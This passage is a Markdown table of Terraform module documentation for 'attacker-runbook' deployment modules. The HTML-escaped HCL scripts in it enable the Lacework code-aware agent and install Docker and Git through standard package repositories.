apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| attacker-runbook-deploy-lacework-code-aware-agent        | ./modules/runbook/deploy-lacework-code-aware-agent   | runbook_deploy_lacework_code_aware_agent         | context.azure.runbook.deploy_lacework_code_aware_agent            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_lacework_code_aware_agent&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-lacework-code-aware-agent   | <pre>locals &amp;&amp;#35;123;<br/>    tool = &quot;lacework&amp;#45;codeware&amp;#45;agent&quot;<br/>    lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path = &quot;/var/lib/lacework&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH=&quot;$&amp;&amp;#35;123;local&amp;#46;lacework&amp;&amp;#35;95;install&amp;&amp;#35;95;path&amp;&amp;#35;125;&quot;  <br/>    <br/>    &amp;#35; Check if Lacework is pre&amp;#45;installed&amp;#46; If installed, add code aware agent config&amp;#46;<br/>    if &amp;&amp;#35;91; &amp;#45;f &quot;$LACEWORK&amp;&amp;#35;95;INSTALL&amp;&amp;#35;95;PATH/datacollector&quot; &amp;&amp;#35;93;; then<br/>        log &quot;Lacework agent is installed, adding code aware agent config&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        file&amp;&amp;#35;95;path=&quot;/var/lib/lacework/config/config&amp;#46;json&quot;<br/>        <br/>        log &quot;Checking for codeaware agent config enable&amp;#46;&amp;#46;&amp;#46;&quot;<br/>        grep &amp;#45;q &#x27;&quot;codeaware&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;enable&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&quot;all&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>        if &amp;&amp;#35;91; $? &amp;#45;ne 0 &amp;&amp;#35;93;; then<br/>            log &quot;Code aware agent not currently enabled&amp;#46;&amp;#46;&amp;#46;&quot;<br/>            grep &amp;#45;q &#x27;&quot;codeaware&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;&#x27; $file&amp;&amp;#35;95;path<br/>            if &amp;&amp;#35;91; $? &amp;#45;eq 0 &amp;&amp;#35;93;; then<br/>                log &quot;Found existing codeaware config &amp;#45; updating&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;s/&quot;codeaware&quot;&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;:&amp;&amp;#35;91;&amp;&amp;#35;91;:space:&amp;&amp;#35;93;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;123;&amp;&amp;#35;91;^&amp;&amp;#35;125;&amp;&amp;#35;93;&amp;&amp;#35;42;&amp;&amp;#35;125;/&quot;codeaware&quot;: &amp;&amp;#35;123;&quot;enable&quot;: &quot;all&quot;&amp;&amp;#35;125;/&#x27; $file&amp;&amp;#35;95;path<br/>            else<br/>                log &quot;No existing codeaware config &amp;#45; appending&amp;#46;&amp;#46;&amp;#46;&quot;<br/>                sed &amp;#45;i &#x27;1s/&amp;&amp;#35;123;/&amp;&amp;#35;123;&amp;&amp;#35;92;n  &quot;codeaware&quot;: &amp;&amp;#35;123;&quot;enable&quot;: &quot;all&quot;&amp;&amp;#35;125;,/&#x27; $file&amp;&amp;#35;95;path<br/>            fi<br/>        else<br/>            log &quot;Code aware agent config already enabled&amp;#46;&quot;<br/>        fi<br/>    fi<br/>    log &quot;Done&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        while &amp;#33; &amp;&amp;#35;91; &amp;#45;f /var/lib/lacework/config/config&amp;#46;json &amp;&amp;#35;93;; do<br/>            log &quot;lacework installation not found &amp;#45; waiting&quot;; <br/>            sleep 120;<br/>        done<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| attacker-runbook-deploy-docker                           | ./modules/runbook/deploy-docker                      | runbook_deploy_docker                            | context.azure.runbook.deploy_docker                               | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_docker&quot;: {<br/>                    &quot;docker_users&quot;: [],<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-docker                      | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;docker&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>    if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            &amp;#35; ensure non root users are added to the docker group<br/>            if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        sudo apt&amp;#45;get update<br/>        sudo apt&amp;#45;get remove &amp;#45;y docker docker&amp;#45;engine docker&amp;#46;io containerd runc<br/>        sudo apt&amp;#45;get install &amp;#45;y &amp;&amp;#35;92;<br/>            ca&amp;#45;certificates &amp;&amp;#35;92;<br/>            curl &amp;&amp;#35;92;<br/>            gnupg &amp;&amp;#35;92;<br/>            lsb&amp;#45;release<br/>        sudo mkdir &amp;#45;p /etc/apt/keyrings<br/>        sudo rm &amp;#45;f /etc/apt/keyrings/docker&amp;#46;gpg<br/>        curl &amp;#45;fsSL https://download&amp;#46;docker&amp;#46;com/linux/ubuntu/gpg &amp;#124; sudo gpg &amp;#45;&amp;#45;dearmor &amp;#45;o /etc/apt/keyrings/docker&amp;#46;gpg<br/>        echo &amp;&amp;#35;92;<br/>        &quot;deb &amp;&amp;#35;91;arch=$&amp;&amp;#35;40;dpkg &amp;#45;&amp;#45;print&amp;#45;architecture&amp;&amp;#35;41; signed&amp;#45;by=/etc/apt/keyrings/docker&amp;#46;gpg&amp;&amp;#35;93; https://download&amp;#46;docker&amp;#46;com/linux/ubuntu &amp;&amp;#35;92;<br/>        $&amp;&amp;#35;40;lsb&amp;&amp;#35;95;release &amp;#45;cs&amp;&amp;#35;41; stable&quot; &amp;#124; sudo tee /etc/apt/sources&amp;#46;list&amp;#46;d/docker&amp;#46;list &gt; /dev/null<br/>        sudo apt&amp;#45;get update<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;docker&amp;#45;ce docker&amp;#45;ce&amp;#45;cli containerd&amp;#46;io docker&amp;#45;buildx&amp;#45;plugin docker&amp;#45;compose&amp;#45;plugin&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        &amp;#35; ensure non root users are added to the docker group<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;;<br/>            &amp;#35; ensure non root users are added to the docker group<br/>            if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>                usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>            fi<br/>            exit 0; <br/>        fi<br/>        yum update &amp;#45;y<br/>        yum remove docker &amp;&amp;#35;92;<br/>                  docker&amp;#45;client &amp;&amp;#35;92;<br/>                  docker&amp;#45;client&amp;#45;latest &amp;&amp;#35;92;<br/>                  docker&amp;#45;common &amp;&amp;#35;92;<br/>                  docker&amp;#45;latest &amp;&amp;#35;92;<br/>                  docker&amp;#45;latest&amp;#45;logrotate &amp;&amp;#35;92;<br/>                  docker&amp;#45;logrotate &amp;&amp;#35;92;<br/>                  docker&amp;#45;engine<br/>        yum install &amp;#45;y yum&amp;#45;utils<br/>        yum&amp;#45;config&amp;#45;manager &amp;#45;&amp;#45;add&amp;#45;repo https://download&amp;#46;docker&amp;#46;com/linux/centos/docker&amp;#45;ce&amp;#46;repo<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;docker&amp;#45;ce docker&amp;#45;ce&amp;#45;cli containerd&amp;#46;io docker&amp;#45;buildx&amp;#45;plugin docker&amp;#45;compose&amp;#45;plugin&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        &amp;#35; ensure non root users are added to the docker group<br/>        if &amp;&amp;#35;91;&amp;&amp;#35;91; &quot;&quot; &amp;#33;= &quot;$&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot; &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;&quot; &amp;&amp;#35;93;&amp;&amp;#35;93; &amp;&amp; grep docker /etc/group &gt; /dev/null 2&gt;&amp;1;  then<br/>            usermod &amp;#45;aG docker $&amp;&amp;#35;123;join&amp;&amp;#35;40;&quot;&amp;&amp;#35;92;nusermod &amp;#45;aG docker &quot;, var&amp;#46;inputs&amp;&amp;#35;91;&quot;docker&amp;&amp;#35;95;users&quot;&amp;&amp;#35;93;&amp;&amp;#35;41;&amp;&amp;#35;125;<br/>        fi<br/>        EOT<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| attacker-runbook-deploy-git                              | ./modules/runbook/deploy-git                         | runbook_deploy_git                               | context.azure.runbook.deploy_git                                  | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;deploy_git&quot;: {<br/>                    &quot;enabled&quot;: false<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-git                         | <pre>locals &amp;&amp;#35;123;<br/>    tool=&quot;git&quot;<br/>    payload = &lt;&lt;&amp;#45;EOT<br/>    log &quot;Checking for $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;#46;&amp;#46;&amp;#46;&quot;<br/>     if &amp;#33; command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>        log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; not found installation required&quot;<br/>    fi<br/>    log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; path: $&amp;&amp;#35;40;command &amp;#45;v  $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125;&amp;&amp;#35;41;&quot;<br/>    EOT<br/>    base64&amp;&amp;#35;95;payload = templatefile&amp;&amp;#35;40;&quot;$&amp;&amp;#35;123;path&amp;#46;module&amp;&amp;#35;125;/&amp;#46;&amp;#46;/&amp;#46;&amp;#46;/delayed&amp;&amp;#35;95;start&amp;#46;sh&quot;, &amp;&amp;#35;123; config = &amp;&amp;#35;123;<br/>        script&amp;&amp;#35;95;name = var&amp;#46;inputs&amp;&amp;#35;91;&quot;tag&quot;&amp;&amp;#35;93;<br/>        log&amp;&amp;#35;95;rotation&amp;&amp;#35;95;count = 2<br/>        apt&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks = &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        apt&amp;&amp;#35;95;packages = &quot;git&quot;<br/>        apt&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        yum&amp;&amp;#35;95;pre&amp;&amp;#35;95;tasks =  &lt;&lt;&amp;#45;EOT<br/>        if command &amp;#45;v $&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; &amp;&gt;/dev/null; then<br/>            log &quot;$&amp;&amp;#35;123;local&amp;#46;tool&amp;&amp;#35;125; found &amp;#45; no installation required&quot;; <br/>            exit 0; <br/>        fi<br/>        EOT<br/>        yum&amp;&amp;#35;95;packages = &quot;git&quot;<br/>        yum&amp;&amp;#35;95;post&amp;&amp;#35;95;tasks = &quot;&quot;<br/>        script&amp;&amp;#35;95;delay&amp;&amp;#35;95;secs = 30<br/>        next&amp;&amp;#35;95;stage&amp;&amp;#35;95;payload = local&amp;#46;payload<br/>    &amp;&amp;#35;125;&amp;&amp;#35;125;&amp;&amp;#35;41;<br/><br/>    outputs = &amp;&amp;#35;123;<br/>        base64&amp;&amp;#35;95;payload = base64gzip&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload = base64encode&amp;&amp;#35;40;local&amp;#46;base64&amp;&amp;#35;95;payload&amp;&amp;#35;41;<br/>        base64&amp;&amp;#35;95;uncompressed&amp;&amp;#35;95;payload&amp;&amp;#35;95;additional = &amp;&amp;#35;91;&amp;&amp;#35;93;<br/>    &amp;&amp;#35;125;<br/>&amp;&amp;#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         